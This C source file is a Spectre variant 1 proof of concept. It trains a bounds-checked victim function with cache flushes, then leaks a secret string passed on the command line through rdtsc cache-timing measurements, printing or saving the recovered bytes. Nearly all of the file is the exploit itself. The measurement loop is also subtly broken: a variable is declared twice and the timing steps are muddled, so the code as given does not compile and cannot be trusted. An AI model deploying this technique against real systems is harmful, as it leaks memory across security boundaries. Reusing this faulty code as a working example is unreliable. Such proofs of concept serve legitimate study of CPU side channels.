#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <x86intrin.h>
#include <limits.h>
#include <string.h>

#define TRAINING_ITERS 100
#define COEFF 10 // training to malicious
#define STAT_ITERS 1000
#define CACHE_LINE 1024 
#define CHAR_SIZE 256

long long array1_len = 16;

uint8_t array1[16];
uint8_t array2[CHAR_SIZE * CACHE_LINE];

size_t temp = 0;
long long min = 0;

void victim_function(long long x) {
    if (min <= x && x < array1_len) {
        temp = array2[array1[x] * CACHE_LINE];
    }
}
// victim_function(x) is function which we are going to abuse 


void latency() {
	for (int i = 0; i < 1000; i++);
}


int main(int argc, char *argv[]) {
    FILE *out;
    char *hidden;
    if (2 <= argc && argc <= 3) {
        hidden = argv[1];
        if (argc == 3) {
            out = fopen(argv[2], "w");
            if (out == NULL) {
                printf("Cannot open file.");
                return 0;
            }
        }
    }  else {
        printf("Usage: ./a.out <data> [<filename>]");
        return 0;
    }
    size_t hidden_len = strlen(hidden) + 1;
    int stat[hidden_len][CHAR_SIZE];
    char found[hidden_len];
    int max[hidden_len];
    for (int i = 0; i < hidden_len; i++) {
        max[i] = -1;
    } 
    for (int i = 0; i < hidden_len; i++) {
        for (int j = 0; j < CHAR_SIZE; j++) stat[i][j] = 0;
    }
    for (int global = 0; global < STAT_ITERS; global++) {

        for (int i = 0; i < array1_len; i++) array1[i] = i + 1;
        for (int i = 0; i < CHAR_SIZE * CACHE_LINE; i++) array2[i] = 1;
        long long dest = (long long) (hidden - 1 - (char *) array1);
        for (size_t iter = 0; iter < hidden_len; iter++) {

            unsigned long long min_time = ULLONG_MAX;
            uint8_t val = 0;

            for (size_t i = 0; i < CHAR_SIZE; i++) {
                _mm_clflush(&array2[i * CACHE_LINE]);
            }
            int training_x = iter % array1_len;

            for (int i = TRAINING_ITERS - 1; i >= 0; i--) {
                _mm_clflush(&min);
                _mm_clflush(&array1_len);
                long long cur_val = i % COEFF == 0 ? dest : training_x;
                for (volatile int j = 0; j < 100; j++) {}
                victim_function(cur_val);
            }
            _mm_clflush(&array2[0]);
            _mm_clflush(&array2[array1[training_x] * CACHE_LINE]);

            dest++;
	    latency();

            unsigned int junk = 1; 
            uint8_t mn = 255;
            for (size_t i = 0; i < CHAR_SIZE; i++) {
                uint8_t contr_opt = (i * 31 + 17) & 255;
                unsigned long long time_start = __rdtsc() * junk;
                junk = array2[contr_opt * CACHE_LINE];
		latency();
                unsigned long long time_start = __rdtsc() * junk;
		latency();
                junk = array2[contr_opt * CACHE_LINE];
		latency();
                unsigned long long time = __rdtsc() * junk - time_start;
                if (min_time > time) {
                    min_time = time;
                    mn = contr_opt;
                }
            }
            stat[iter][mn]++; 
        }
    }
    for (int i = 0; i < hidden_len; i++) found[i] = 0;
    for (int i = 0; i < hidden_len; i++) {
        for (unsigned int j = 0; j < CHAR_SIZE; j++) {
            if (stat[i][j] > max[i]) {
                found[i] = j;
                max[i] = stat[i][j];
            }
        }
        
    }
    if (argc == 2) {
        printf("answer: %s\n", found + 1);
        for (size_t i = 1; i < hidden_len; i++) {
            printf("char: %c, hits: %i/%i\n", found[i], max[i], STAT_ITERS);
        }
    } else {
        fprintf(out, "answer: %s\n", found + 1);
        for (size_t i = 1; i < hidden_len; i++) {
            fprintf(out, "char: %c, hits: %i/%i\n", found[i], max[i], STAT_ITERS);
        }
        fclose(out);
    }
    fflush(stdout);
    return 0;
}
